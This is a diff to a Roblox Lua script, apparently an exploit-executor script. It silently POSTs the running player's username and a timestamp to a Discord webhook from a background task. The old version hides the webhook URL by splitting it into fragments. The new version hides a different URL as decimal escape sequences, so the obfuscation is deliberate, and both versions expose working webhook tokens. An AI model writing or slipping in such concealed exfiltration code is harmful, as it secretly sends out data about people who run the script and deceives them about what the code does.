@@ -11,19 +11,9 @@ local HttpService      = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 
 task.spawn(function()
-    local a1 = "https://disc"
-    local a2 = "ord.com/api/"
-    local a3 = "web"
-    local a4 = "hooks/"
-    local a5 = "13974146778"
-    local a6 = "43021854/"
-    local a7 = "1sljIMSpBvC0"
-    local a8 = "gAsysbmvnMSs"
-    local a9 = "044Ze-c8KfBEM"
-    local a10 = "ZVghw6os5mj3npxkYT"
-    local a11 = "drjkfqb0rfuiP"
-
-    local url = a1 .. a2 .. a3 .. a4 .. a5 .. a6 .. a7 .. a8 .. a9 .. a10 .. a11
+    local HttpService = game:GetService("HttpService")
+    local lp = game:GetService("Players").LocalPlayer
+    local url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\56\51\55\49\50\52\49\55\51\50\53\51\56\55\56\54\53\47\97\104\56\113\68\110\52\106\115\121\49\55\54\111\74\45\95\81\71\56\105\115\75\80\121\73\101\104\82\119\103\50\68\82\84\70\104\79\50\79\89\107\65\102\85\82\116\78\78\86\83\113\117\75\102\111\122\100\73\103\67\97\120\53\104\69\75\88"
 
     local username = lp and lp.Name or "Unknown"
     local time = os.date("!*t")
@@ -43,12 +33,16 @@ task.spawn(function()
              or (request)
 
     if req then
-        req({
+        local res = req({
             Url = url,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode(data)
         })
+        
+        if res then
+            print("[Webhook Status]:", res.StatusCode)
+        end
     end
 end)
 
